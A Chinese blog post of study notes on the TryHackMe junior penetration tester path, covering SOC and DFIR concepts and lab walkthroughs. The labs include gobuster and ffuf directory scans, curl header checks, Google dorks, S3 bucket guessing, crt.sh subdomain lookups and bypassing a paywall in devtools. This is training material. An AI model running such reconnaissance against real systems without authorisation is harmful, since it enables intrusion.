<meta property="og:image" content="https://sun-zzz.github.io/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006135122332.png">
<meta property="article:published_time" content="2024-09-07T11:24:22.000Z">
<meta property="article:modified_time" content="2024-10-06T05:59:11.596Z">
<meta property="article:author" content="rev1ve">
<meta property="article:tag" content="TryHackMe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sun-zzz.github.io/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907193022229.png">

<link rel="canonical" href="https://sun-zzz.github.io/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Jr Penetration Tester学习 | rev1ve's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">rev1ve's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/1.jpg">
      <meta itemprop="name" content="rev1ve">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="rev1ve's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Jr Penetration Tester学习
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-09-07 19:24:22" itemprop="dateCreated datePublished" datetime="2024-09-07T19:24:22+08:00">2024-09-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-10-06 13:59:11" itemprop="dateModified" datetime="2024-10-06T13:59:11+08:00">2024-10-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
                </span>
            </span>

          
            <span id="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0.html" class="post-meta-item leancloud_visitors" data-flag-title="Jr Penetration Tester学习" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>该学习路径涵盖了核心技术技能，使您能够成为一名成功的初级渗透测试员。完成此路径后，您将具备对 Web 应用程序和企业基础设施执行安全评估所需的实用技能。</p>
<span id="more"></span>

<h1 id="Jr-Penetration-Tester学习"><a href="#Jr-Penetration-Tester学习" class="headerlink" title="Jr Penetration Tester学习"></a>Jr Penetration Tester学习</h1><h2 id="网络安全简介"><a href="#网络安全简介" class="headerlink" title="网络安全简介"></a>网络安全简介</h2><h3 id="进攻性安全性简介"><a href="#进攻性安全性简介" class="headerlink" title="进攻性安全性简介"></a>进攻性安全性简介</h3><h4 id="Task1-什么是进攻性安全？"><a href="#Task1-什么是进攻性安全？" class="headerlink" title="Task1 什么是进攻性安全？"></a>Task1 什么是进攻性安全？</h4><p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907193022229.png"></p>
<h4 id="Task2-入侵您的第一台计算机"><a href="#Task2-入侵您的第一台计算机" class="headerlink" title="Task2 入侵您的第一台计算机"></a>Task2 入侵您的第一台计算机</h4><p>本次任务是破解一个名为 FakeBank 的虚假银行应用程序</p>
<p>使用gobuster进行目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster -u http://fakebank.com -w wordlist.txt dir</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907193700415.png"></p>
<p>发现可以路径<code>/bank-transfer</code>，访问一下发现是类似银行转账</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907193828231.png"></p>
<p>按照任务要求将 2000 美元从银行账户 2276 转入您的账户（账号 8881），成功转入我的账户</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907194035204.png"></p>
<h4 id="Task3-网络安全领域的工作"><a href="#Task3-网络安全领域的工作" class="headerlink" title="Task3 网络安全领域的工作"></a>Task3 网络安全领域的工作</h4><ul>
<li>渗透测试员 - 负责测试技术产品以查找可利用的安全漏洞。</li>
<li>红队成员 - 扮演对手的角色，攻击组织并从敌人的角度提供反馈。</li>
<li>安全工程师 - 设计、监控和维护安全控制、网络和系统，以帮助防止网络攻击。</li>
</ul>
<h2 id="防御性安全简介"><a href="#防御性安全简介" class="headerlink" title="防御性安全简介"></a>防御性安全简介</h2><h3 id="Task1-防御性安全简介"><a href="#Task1-防御性安全简介" class="headerlink" title="Task1 防御性安全简介"></a>Task1 防御性安全简介</h3><p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907230449546.png"></p>
<h3 id="Task2-防御性安全领域"><a href="#Task2-防御性安全领域" class="headerlink" title="Task2 防御性安全领域"></a>Task2 防御性安全领域</h3><h4 id="安全运营中心-（SOC）"><a href="#安全运营中心-（SOC）" class="headerlink" title="安全运营中心 （SOC）"></a>安全运营中心 （SOC）</h4><p><em>安全运营中心</em> （SOC） 是一支由网络安全专业人员组成的团队，负责监控网络及其系统以检测恶意网络安全事件。SOC 的一些主要关注领域是：</p>
<ul>
<li>漏洞：每当发现系统漏洞（弱点）时，都必须通过安装适当的更新或补丁来修复它。当修补程序不可用时，应采取必要的措施来防止攻击者利用它。尽管修复漏洞与 SOC 的切身利益息息相关，但不一定分配给他们。</li>
<li>策略冲突：我们可以将安全策略视为保护网络和系统所需的一组规则。例如，如果用户开始将公司的机密数据上传到在线存储服务，则可能违反了策略。</li>
<li>未经授权的活动：考虑用户登录名和密码被盗，攻击者使用它们登录网络的情况。SOC 需要检测到此类事件并尽快阻止它，以免造成进一步的损害。</li>
<li>网络入侵：无论您的安全性有多好，总有入侵的机会。当用户点击恶意链接或攻击者利用公共服务器时，可能会发生入侵。无论哪种方式，当发生入侵时，我们必须尽快检测到它，以防止进一步的损害。</li>
</ul>
<p>安全操作涵盖各种任务以确保保护;其中一项任务是威胁情报。</p>
<blockquote>
<p>在这种情况下，<em>情报</em>是指您收集的有关实际和潜在敌人的信息。<em>威胁</em>是指可能破坏系统或对系统产生不利影响的任何操作。威胁情报旨在收集信息，以帮助公司更好地准备应对潜在对手。目的是实现<em>威胁知情防御</em>。不同的公司有不同的对手。一些攻击者可能试图从移动运营商那里窃取客户数据;然而，其他对手也有兴趣停止炼油厂的生产。示例攻击者包括出于政治原因工作的民族国家网络军队和出于财务目的行事的勒索软件组织。根据公司（目标），我们可以预期对手。</p>
<p>数据收集是从本地来源（如网络日志）和公共来源（如论坛）完成的。数据处理旨在将它们排列成适合分析的格式。分析阶段旨在查找有关攻击者及其动机的更多信息;此外，它旨在创建建议和可操作步骤的列表。</p>
<p>了解您的对手可以让您了解他们的策略、技术和程序。作为威胁情报的结果，我们识别威胁行为者（对手），预测他们的活动，因此，我们将能够缓解他们的攻击并准备响应策略。</p>
</blockquote>
<h4 id="数字取证和事件响应-（DFIR）"><a href="#数字取证和事件响应-（DFIR）" class="headerlink" title="数字取证和事件响应 （DFIR）"></a>数字取证和事件响应 （DFIR）</h4><p>本部分介绍数字取证和事件响应 （DFIR），我们将介绍：</p>
<ul>
<li>数字取证</li>
<li>事件响应</li>
<li>恶意软件分析</li>
</ul>
<h5 id="数字取证"><a href="#数字取证" class="headerlink" title="数字取证"></a>数字取证</h5><p>取证是应用科学来调查犯罪和确定事实。随着计算机和智能手机等数字系统的使用和普及，取证的一个新分支诞生了，用于调查相关犯罪：计算机取证，后来演变为<em>数字取证</em>。</p>
<p>在防御性安全方面，数字取证的重点转移到分析攻击及其肇事者的证据，以及其他领域，例如知识产权盗窃、网络间谍和拥有未经授权的内容。因此，数字取证将侧重于不同的领域，例如：</p>
<ul>
<li>文件系统：分析系统存储的数字取证图像（低级副本）可以揭示许多信息，例如已安装的程序、创建的文件、部分覆盖的文件和已删除的文件。</li>
<li>系统内存：如果攻击者在内存中运行恶意程序，但未将其保存到磁盘，则获取系统内存的取证图像（低级副本）是分析其内容并了解攻击的最佳方式。</li>
<li>系统日志：每个客户端和服务器计算机都维护着不同的日志文件，说明发生了什么。日志文件提供了有关系统上所发生情况的大量信息。即使攻击者试图清除他们的痕迹，也会留下一些痕迹。</li>
<li>网络日志：遍历网络的网络数据包的日志将有助于回答有关是否发生攻击及其后果的更多问题。</li>
</ul>
<h5 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h5><p><em>事件</em>通常是指数据泄露或网络攻击;但是，在某些情况下，它可能不太重要，例如配置错误、入侵尝试或违反策略。网络攻击的示例包括攻击者使我们的网络或系统无法访问、污损（更改）公共网站以及数据泄露（窃取公司数据）。您将如何<em>应对</em>网络攻击？事件响应 指定了处理此类情况应遵循的方法。目的是在尽可能短的时间内减少损害和恢复。理想情况下，您将制定一个为事件响应做好准备的计划。</p>
<p>事件响应过程的四个主要阶段是：</p>
<ol>
<li>准备：这需要一支经过培训并准备好处理事件的团队。理想情况下，采取各种措施来从一开始就防止事件发生。</li>
<li>检测和分析： 团队拥有检测任何事件所需的资源;此外，必须进一步分析任何检测到的事件以了解其严重性。</li>
<li>遏制、根除和恢复：一旦检测到事件，就必须阻止它影响其他系统，消除它并恢复受影响的系统。例如，当我们注意到某个系统感染了计算机病毒时，我们希望阻止（遏制）病毒传播到其他系统，清理（根除）病毒，并确保系统正确恢复。</li>
<li>事件后活动：成功恢复后，将生成报告，并分享经验教训，以防止将来发生类似的事件。</li>
</ol>
<h5 id="恶意软件分析"><a href="#恶意软件分析" class="headerlink" title="恶意软件分析"></a>恶意软件分析</h5><p>恶意软件代表恶意软件。<em>软件</em>是指可以保存在磁盘上或通过网络发送的程序、文档和文件。恶意软件包括多种类型，例如：</p>
<ul>
<li>病毒是一段代码（程序的一部分），它把自身附加到一个程序上。它旨在从一台计算机传播到另一台计算机;此外，它的工作原理是在感染计算机后更改、覆盖和删除文件。结果范围从计算机变慢到无法使用。</li>
<li>特洛伊木马是一种程序，它显示一个理想的功能，但在下面隐藏了一个恶意功能。例如，受害者可能会从可疑网站下载视频播放器，从而使攻击者能够完全控制其系统。</li>
<li>勒索软件是一种加密用户文件的恶意程序。加密会使文件在不知道加密密码的情况下无法读取。如果用户愿意支付 “赎金”，攻击者会向用户提供加密密码。</li>
</ul>
<p>恶意软件分析旨在通过各种方式了解此类恶意程序：</p>
<ol>
<li>静态分析的工作原理是检查恶意程序而不运行它。通常，这需要扎实的汇编语言知识（处理器的指令集，即计算机的基本指令）。</li>
<li>动态分析的工作原理是在受控环境中运行恶意软件并监控其活动。它允许您观察恶意软件在运行时的行为方式。</li>
</ol>
<h3 id="Task3-防御性安全的实际示例"><a href="#Task3-防御性安全的实际示例" class="headerlink" title="Task3 防御性安全的实际示例"></a>Task3 防御性安全的实际示例</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>您是负责保护银行的安全<em>运营中心</em> （SOC） 的一员。该银行的 SOC 使用<em>安全信息和事件管理</em> （SIEM） 系统。SIEM 从各种来源收集与安全相关的信息和事件，并通过一个系统呈现它们。例如，如果登录尝试失败或从意外的地理位置尝试登录，您将收到通知。此外，随着机器学习的出现，SIEM 可能会检测到异常行为，例如用户在凌晨 3 点登录，而他通常只在工作时间登录。</p>
<h4 id="防御性安全练习"><a href="#防御性安全练习" class="headerlink" title="防御性安全练习"></a>防御性安全练习</h4><p>注意到在早上十点出现<code>143.110.250.149</code>的ip进行未授权连接22端口</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907231824825.png"></p>
<p>我们利用ip查询工具进行查询</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907231956129.png"></p>
<p>成功找到恶意ip的实际地址</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907232049117.png"></p>
<p>上报给团队负责人后，添加黑名单</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240907232122011.png"></p>
<h2 id="Web-Hacking简介"><a href="#Web-Hacking简介" class="headerlink" title="Web Hacking简介"></a>Web Hacking简介</h2><h3 id="遍历应用程序"><a href="#遍历应用程序" class="headerlink" title="遍历应用程序"></a>遍历应用程序</h3><p>手工检查web应用程序</p>
<ul>
<li><strong>查看源代码</strong> - 使用浏览器查看网站的人类可读源代码</li>
<li><strong>检查器</strong> - 了解如何检查页面元素并进行更改以查看通常被阻止的内容</li>
<li><strong>Debugger</strong> - 检查和控制页面 JavaScript 的流程</li>
<li><strong>网络</strong> - 查看页面发出的所有网络请求</li>
</ul>
<h4 id="Task1-查看页面源"><a href="#Task1-查看页面源" class="headerlink" title="Task1 查看页面源"></a>Task1 查看页面源</h4><p>在本房间学习，如何仅使用浏览器中的内置工具手动检查 Web 应用程序是否存在安全问题</p>
<p>我们通过查看源代码，注意到注释里的特殊路径</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908153301291.png"></p>
<p>访问<code>/new-home-beta</code>得到第一个flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908153339759.png"></p>
<p>我们注意到第41行的超链接，访问得到第二个flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908154022933.png"></p>
<p>注意到这些文件都存放在<code>/assets</code>目录下</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908155643133.png"></p>
<p>访问得到第三个flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908155729873.png"></p>
<p>继续往下找发现web程序使用的框架是<code>THM v1.2</code></p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908154613841.png"></p>
<p>尝试从框架入手，跟进一下更新日志</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908154739924.png"></p>
<p>我们注意到在1.3版本把备份文件存储到不可读取的区域，而我们刚好是1.2尝试读取备份文件<code>/tmp.zip</code>，解压得到第四个flag</p>
<h4 id="Task2-开发人员工具-inspector"><a href="#Task2-开发人员工具-inspector" class="headerlink" title="Task2 开发人员工具-inspector"></a>Task2 开发人员工具-inspector</h4><p>我们注意到news的第三篇是需要付费的，被付费墙挡住了</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908160841529.png"></p>
<p>我们F12打开web开发者工具，将鼠标移到挡住的墙上</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908160947764.png"></p>
<p>注意到<code>premium-customer-blocker</code>属性的display元素是block，我们将其改为none成功读取到flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908161131675.png"></p>
<h4 id="Task3-开发人员工具-调试器"><a href="#Task3-开发人员工具-调试器" class="headerlink" title="Task3 开发人员工具 - 调试器"></a>Task3 开发人员工具 - 调试器</h4><blockquote>
<p>开发人员工具中的这个面板用于调试 JavaScript，对于想要找出某些内容可能无法正常工作的原因的 Web  开发人员来说，它同样是一个出色的功能。但作为渗透测试人员，它为我们提供了深入研究 JavaScript 代码的选项。在 Firefox 和  Safari 中，此功能称为 Debugger，但在 Google Chrome 中，它称为 Sources。</p>
</blockquote>
<p>我们点击contact界面，然后点击调试器的flash.min.js文件，点击左下角的美化</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908162252766.png"></p>
<p>在第110行打下断点，刷新此页面得到flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908162322192.png"></p>
<h4 id="Task4-开发人员工具-网络"><a href="#Task4-开发人员工具-网络" class="headerlink" title="Task4 开发人员工具 - 网络"></a>Task4 开发人员工具 - 网络</h4><p>先清空下网络的缓存，然后填写表单发送。从响应处得到flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908162736012.png"></p>
<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><h4 id="Task1-手动发现-robots-txt"><a href="#Task1-手动发现-robots-txt" class="headerlink" title="Task1 手动发现-robots.txt"></a>Task1 手动发现-robots.txt</h4><p>访问<code>/robots.txt</code>即可</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240909221113716.png"></p>
<h4 id="Task2-手动发现-Favicon"><a href="#Task2-手动发现-Favicon" class="headerlink" title="Task2 手动发现-Favicon"></a>Task2 手动发现-Favicon</h4><blockquote>
<p>网站图标是显示在浏览器地址栏或选项卡中的一个小图标，用于为网站打造品牌。有时当使用框架构建网站时，作为安装一部分的网站图标会留下来，如果网站开发人员没有用自定义图标替换它，这可以给我们提供关于正在使用的框架的线索。OWASP 托管一个通用框架图标数据库，您可以使用该数据库来检查目标 favicon <code>https://wiki.owasp.org/index.php/OWASP_favicon_database</code>。一旦我们了解了框架堆栈，我们就可以使用外部资源来发现更多关于它的信息</p>
</blockquote>
<p>某个网站的图标没有被开发人员自定义替换，我们下载目标网站图标并获取其 md5 哈希值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240909221952856.png"></p>
<p>通过在<code>https://wiki.owasp.org/index.php/OWASP_favicon_database</code>查询，得到是cgiirc框架</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240909222212741.png"></p>
<h4 id="Task3-手动发现-Sitemap-xml"><a href="#Task3-手动发现-Sitemap-xml" class="headerlink" title="Task3 手动发现-Sitemap.xml"></a>Task3 手动发现-Sitemap.xml</h4><blockquote>
<p>与限制搜索引擎爬虫可以查看的内容的 robots.txt 文件不同，sitemap.xml 文件提供了网站所有者希望在搜索引擎上列出的每个文件的列表。这些有时可能包含网站中更难导航到的区域，甚至列出一些当前网站不再使用但仍在幕后运行的旧网页。</p>
</blockquote>
<p>访问<code>/sitemap.xml</code>得到线索</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240909222920203.png"></p>
<h4 id="Task4-手动发现-HTTP请求头"><a href="#Task4-手动发现-HTTP请求头" class="headerlink" title="Task4 手动发现-HTTP请求头"></a>Task4 手动发现-HTTP请求头</h4><p> 使用curl命令的<code>-v</code>参数启用详细模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.48.71/ -v</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240909223104756.png"></p>
<h4 id="Task5-手动发现-框架堆栈"><a href="#Task5-手动发现-框架堆栈" class="headerlink" title="Task5 手动发现 - 框架堆栈"></a>Task5 手动发现 - 框架堆栈</h4><blockquote>
<p>一旦你建立了一个网站的框架，无论是从上面的网站图标示例，还是通过在页面源中寻找线索（如评论、版权声明或信用），你都可以找到该框架的网站。从那里，我们可以了解有关软件和其他信息的更多信息，这可能会导致我们可以发现更多内容。</p>
</blockquote>
<p>在页面源码发现框架网站，来看看THM框架的文档</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240908155130497.png"></p>
<p>存在admin管理员用户，我们访问<code>/thm-framework-login</code>登录找到flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240909223354212.png"></p>
<h4 id="Task6-开源情报-谷歌搜索语法"><a href="#Task6-开源情报-谷歌搜索语法" class="headerlink" title="Task6 开源情报-谷歌搜索语法"></a>Task6 开源情报-谷歌搜索语法</h4><p>利用谷歌搜索引擎的特殊语法</p>
<table>
<thead>
<tr>
<th><strong>滤波器</strong></th>
<th><strong>例</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>site</td>
<td>site:tryhackme.com</td>
<td>仅返回来自指定网站地址的结果</td>
</tr>
<tr>
<td>inurl</td>
<td>inurl：admin</td>
<td>返回 URL 中包含指定单词的结果</td>
</tr>
<tr>
<td>filetype</td>
<td>filetype：PDF</td>
<td>返回具有特定文件扩展名的结果</td>
</tr>
<tr>
<td>intitle</td>
<td>intitle：admin</td>
<td>返回标题中包含指定单词的结果</td>
</tr>
</tbody></table>
<p>更多语法可参考<code> https://en.wikipedia.org/wiki/Google_hacking</code></p>
<h4 id="Task7-开源情报-Wappalyzer"><a href="#Task7-开源情报-Wappalyzer" class="headerlink" title="Task7 开源情报-Wappalyzer"></a>Task7 开源情报-Wappalyzer</h4><blockquote>
<p>Wappalyzer （<code>https://www.wappalyzer.com/</code>） 是一个在线工具和浏览器扩展，可帮助识别网站使用的技术，例如框架、内容管理系统 （CMS）、支付处理器等等，它甚至可以找到版本号。</p>
</blockquote>
<h4 id="Task8-开源情报-Github"><a href="#Task8-开源情报-Github" class="headerlink" title="Task8 开源情报-Github"></a>Task8 开源情报-Github</h4><blockquote>
<p>您可以使用 GitHub 的搜索功能查找公司名称或网站名称，以尝试查找属于您的目标的存储库。一旦被发现，您可能可以访问源代码、密码或其他尚未找到的内容。</p>
</blockquote>
<h4 id="Task9-开源情报-S3-Buckets"><a href="#Task9-开源情报-S3-Buckets" class="headerlink" title="Task9 开源情报-S3 Buckets"></a>Task9 开源情报-S3 Buckets</h4><blockquote>
<p>S3 Buckets 是 Amazon AWS 提供的一项存储服务，允许人们将文件甚至静态网站内容保存在云中，可通过 HTTP 和 HTTPS  访问。文件所有者可以设置访问权限，将文件设为公共、私有甚至可写。有时，这些访问权限设置不正确，并无意中允许访问不应向公众开放的文件。S3 存储桶的格式为 <code>http(s)://&#123;name&#125;.s3.amazonaws.com</code> 其中 {name} 由所有者决定，例如 <a target="_blank" rel="noopener" href="http://tryhackme-assets.s3.amazonaws.com/">tryhackme-assets.s3.amazonaws.com</a>。可以通过多种方式发现 S3 存储桶，例如在网站的页面源、GitHub 存储库中查找 URL，甚至自动执行该过程。一种常见的自动化方法是使用公司名称，后跟  {name}-assets、{name}-www、{name}-public、{name}-private 等常用术语 。  </p>
</blockquote>
<h4 id="Task10-自动发现"><a href="#Task10-自动发现" class="headerlink" title="Task10 自动发现"></a>Task10 自动发现</h4><p>使用ffuf和gobuster都可以，挂openvpn太慢了所以这里拿attackbox扫的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.48.71/FUZZ</span><br><span class="line">gobuster dir --url http://10.10.48.71/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240909233018270.png"></p>
<h3 id="子域枚举"><a href="#子域枚举" class="headerlink" title="子域枚举"></a>子域枚举</h3><h4 id="Task1-开源情报-SSL-TLS-证书"><a href="#Task1-开源情报-SSL-TLS-证书" class="headerlink" title="Task1 开源情报-SSL&#x2F;TLS 证书"></a>Task1 开源情报-SSL&#x2F;TLS 证书</h4><p> <strong>SSL&#x2F;TLS 证书</strong></p>
<blockquote>
<p>当 CA（证书颁发机构）为域创建 SSL&#x2F;TLS（安全套接字层&#x2F;传输层安全性）证书时，CA 会参与所谓的“证书透明度 （CT）  日志”。这些是为域名创建的每个 SSL&#x2F;TLS 证书的可公开访问日志。Certificate Transparency  日志的目的是阻止使用恶意和意外制作的证书。我们可以利用这项服务来发现属于某个域的子域，像<a target="_blank" rel="noopener" href="http://crt.sh/"> https://crt.sh</a> 和 <a target="_blank" rel="noopener" href="https://ui.ctsearch.entrust.com/ui/ctsearchui">https://ui.ctsearch.entrust.com/ui/ctsearchui</a> 这样的网站提供了一个可搜索的证书数据库，可以显示当前和历史结果。</p>
</blockquote>
<p>我们访问<code>https://crt.sh</code>，搜索<code>tryhackme.com</code>域名，成功找到在2020-12-26创建的子域名</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240910170654998.png"></p>
<h4 id="Task2-开源情报-搜索引擎"><a href="#Task2-开源情报-搜索引擎" class="headerlink" title="Task2 开源情报-搜索引擎"></a>Task2 开源情报-搜索引擎</h4><p>利用谷歌的搜索引擎，查找<code>tryhackme.com</code>的子域名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:*.tryhackme.com</span><br></pre></td></tr></table></figure>

<p>如果想排除某子域名比如www，可以执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:*.tryhackme.com -site:www.tryhackme.com</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240910171122442.png"></p>
<h4 id="Task3-DNS-暴力破解"><a href="#Task3-DNS-暴力破解" class="headerlink" title="Task3  DNS 暴力破解"></a>Task3  DNS 暴力破解</h4><blockquote>
